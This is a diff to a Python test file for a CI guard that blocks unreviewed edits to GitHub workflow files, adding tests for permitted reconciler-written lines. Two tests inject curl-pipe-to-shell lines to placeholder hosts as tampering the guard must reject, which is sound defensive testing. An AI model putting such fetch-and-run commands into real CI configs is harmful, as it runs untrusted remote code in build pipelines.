@@ -206,10 +206,17 @@ def _bump_pin(*, root: Path, old: str, new: str) -> Path:
 def test_workflow_check_allows_a_pin_only_bump_without_a_declaration(*, tmp_path: Path) -> None:
     """The pin-bump lane must keep landing: a binding that reds it is an outage, not a fix.
 
-    Measured over the four most recent real bumps, that lane alters ONLY a
-    reusable-workflow version ref and a container image tag. The allowance is
-    keyed on that diff SHAPE, never on who authored it -- this guard cannot
-    distinguish factory from host and must not pretend to.
+    A pin-only bump is still the common case and must keep passing. The
+    allowance is keyed on the diff SHAPE, never on who authored it -- this guard
+    cannot distinguish factory from host and must not pretend to.
+
+    This docstring previously justified the pin-only rule by citing the four most
+    recent real bumps as altering ONLY these two line shapes. That measurement
+    was taken while `ci_yaml_canonical_reconcile` was hard-failing every bump
+    with a slug to adopt, so a non-pin line was impossible rather than merely
+    unobserved, and the rule it justified later froze this repo. The permitted
+    shapes are now derived from the producer's writer source instead; see
+    `scripts/check-no-workflow-edits.sh` and livespec-s43svm.36.
     """
     _repo_with_base_carrying_workflow(root=tmp_path, pin="v1.28.12")
     _bump_pin(root=tmp_path, old="v1.28.12", new="v1.28.13")
@@ -231,6 +238,160 @@ def test_workflow_check_still_blocks_a_pin_bump_carrying_one_extra_line(*, tmp_p
     workflow = _bump_pin(root=tmp_path, old="v1.28.12", new="v1.28.13")
     workflow.write_text(
         workflow.read_text(encoding="utf-8") + "      run: curl https://example.invalid/x | sh\n",
+        encoding="utf-8",
+    )
+    _git(cwd=tmp_path, args=["add", ".github/workflows/ci.yml"])
+
+    result = _run_workflow_check(cwd=tmp_path)
+
+    assert result.returncode == 1, result.stderr
+    assert "tracked exemption declaration" in result.stderr
+
+
+_AGGREGATE_LINE = (
+    '          just check-aggregate-completeness || failed="$failed check-aggregate-completeness"\n'
+)
+_ADOPTED_LINE = (
+    '          just check-self-hosted-uv-lane || failed="$failed check-self-hosted-uv-lane"\n'
+)
+
+
+def _repo_with_batched_aggregate(*, root: Path) -> Path:
+    """A consumer running the aggregate in the BATCHED form, carrying no matrix list.
+
+    This is livespec-overseer's own shape, and the shape on which
+    `ci_yaml_canonical_reconcile` selects its `batch_line_for` writer.
+    """
+    _git(cwd=root, args=["init", "-q", "-b", "master"])
+    workflow = root / ".github" / "workflows" / "ci.yml"
+    workflow.parent.mkdir(parents=True, exist_ok=True)
+    workflow.write_text(
+        "name: CI\njobs:\n  batch:\n    steps:\n      - run: |\n"
+        '          failed=""\n' + _AGGREGATE_LINE,
+        encoding="utf-8",
+    )
+    _commit(cwd=root, rel="README.md", author=_HUMAN_AUTHOR, message="base")
+    _git(cwd=root, args=["update-ref", "refs/remotes/origin/master", "HEAD"])
+    return workflow
+
+
+def _repo_with_aggregate_matrix(*, root: Path) -> Path:
+    """A consumer whose `matrix.target:` list carries the aggregate slug.
+
+    That list is the condition under which the reconciler uses its MATRIX writer
+    instead of the batched one. The `other` job deliberately carries a `needs:`
+    bullet indented to match the matrix entries, so the adversarial test below
+    can add a line byte-identical to a real matrix entry.
+    """
+    _git(cwd=root, args=["init", "-q", "-b", "master"])
+    workflow = root / ".github" / "workflows" / "ci.yml"
+    workflow.parent.mkdir(parents=True, exist_ok=True)
+    workflow.write_text(
+        "name: CI\n"
+        "jobs:\n"
+        "  checks:\n"
+        "    strategy:\n"
+        "      matrix:\n"
+        "        target:\n"
+        "          - check-aggregate-completeness\n"
+        "          - check-lint\n"
+        "    steps:\n"
+        "      - run: just ${{ matrix.target }}\n"
+        "  other:\n"
+        "    needs:\n"
+        "          - check-aggregate-completeness\n"
+        "    steps:\n"
+        "      - run: echo hi\n",
+        encoding="utf-8",
+    )
+    _commit(cwd=root, rel="README.md", author=_HUMAN_AUTHOR, message="base")
+    _git(cwd=root, args=["update-ref", "refs/remotes/origin/master", "HEAD"])
+    return workflow
+
+
+def test_workflow_check_allows_the_reconciler_batched_line(*, tmp_path: Path) -> None:
+    """The bump lane adopts canonical slugs, so its diff is not pin-only any more.
+
+    `ci_yaml_canonical_reconcile` mirrors each newly-adopted canonical slug into
+    the consumer's CI. On a batched consumer it writes the repo's OWN aggregate
+    line with the slug substituted (`batch_line_for`). Before this allowance that
+    line failed the guard, and livespec-overseer alone froze four releases behind
+    the fleet while the reconciler was working correctly (livespec-s43svm.36).
+    """
+    workflow = _repo_with_batched_aggregate(root=tmp_path)
+    workflow.write_text(workflow.read_text(encoding="utf-8") + _ADOPTED_LINE, encoding="utf-8")
+    _git(cwd=tmp_path, args=["add", ".github/workflows/ci.yml"])
+
+    result = _run_workflow_check(cwd=tmp_path)
+
+    assert result.returncode == 0, result.stderr
+
+
+def test_workflow_check_blocks_a_batched_line_carrying_an_appended_command(
+    *, tmp_path: Path
+) -> None:
+    """The batched allowance is an EQUALITY against the repo's own aggregate line.
+
+    A line that merely looks batched -- right prefix, extra command appended --
+    must still fail, or the allowance would smuggle arbitrary shell into CI.
+    """
+    workflow = _repo_with_batched_aggregate(root=tmp_path)
+    workflow.write_text(
+        workflow.read_text(encoding="utf-8")
+        + '          just check-evil || failed="$failed check-evil"; curl https://x.invalid | sh\n',
+        encoding="utf-8",
+    )
+    _git(cwd=tmp_path, args=["add", ".github/workflows/ci.yml"])
+
+    result = _run_workflow_check(cwd=tmp_path)
+
+    assert result.returncode == 1, result.stderr
+    assert "tracked exemption declaration" in result.stderr
+
+
+def test_workflow_check_allows_the_reconciler_matrix_bullet(*, tmp_path: Path) -> None:
+    """The reconciler's OTHER writer: `{indent}- {slug}` into the aggregate matrix.
+
+    livespec-overseer has no aggregate-bearing matrix list, so this leg cannot be
+    exercised against the repo itself. It is covered here rather than shipped
+    unexercised -- an allowance believed correct rather than shown correct is how
+    the defect this repairs was introduced.
+    """
+    workflow = _repo_with_aggregate_matrix(root=tmp_path)
+    workflow.write_text(
+        workflow.read_text(encoding="utf-8").replace(
+            "          - check-lint\n",
+            "          - check-self-hosted-uv-lane\n          - check-lint\n",
+        ),
+        encoding="utf-8",
+    )
+    _git(cwd=tmp_path, args=["add", ".github/workflows/ci.yml"])
+
+    result = _run_workflow_check(cwd=tmp_path)
+
+    assert result.returncode == 0, result.stderr
+
+
+def test_workflow_check_blocks_a_needs_bullet_identical_to_a_matrix_entry(
+    *, tmp_path: Path
+) -> None:
+    """THE LEG THAT DECIDES WHETHER THE MATRIX ALLOWANCE IS A HOLE.
+
+    A `needs:` bullet can be BYTE-IDENTICAL to a real matrix entry -- same
+    indent, same slug -- so asking "is this line one of the matrix entries?"
+    accepts it, and a job's dependency graph becomes editable without review.
+    Verified against an earlier draft of this guard, which did accept it.
+
+    The shipped test asks instead whether the aggregate-bearing list ITSELF
+    gained the line, so an identical bullet added anywhere else leaves the counts
+    equal and is rejected.
+    """
+    workflow = _repo_with_aggregate_matrix(root=tmp_path)
+    workflow.write_text(
+        workflow.read_text(encoding="utf-8").replace(
+            "    needs:\n          - check-aggregate-completeness\n",
+            "    needs:\n          - check-aggregate-completeness\n          - check-lint\n",
+        ),
         encoding="utf-8",
     )
     _git(cwd=tmp_path, args=["add", ".github/workflows/ci.yml"])
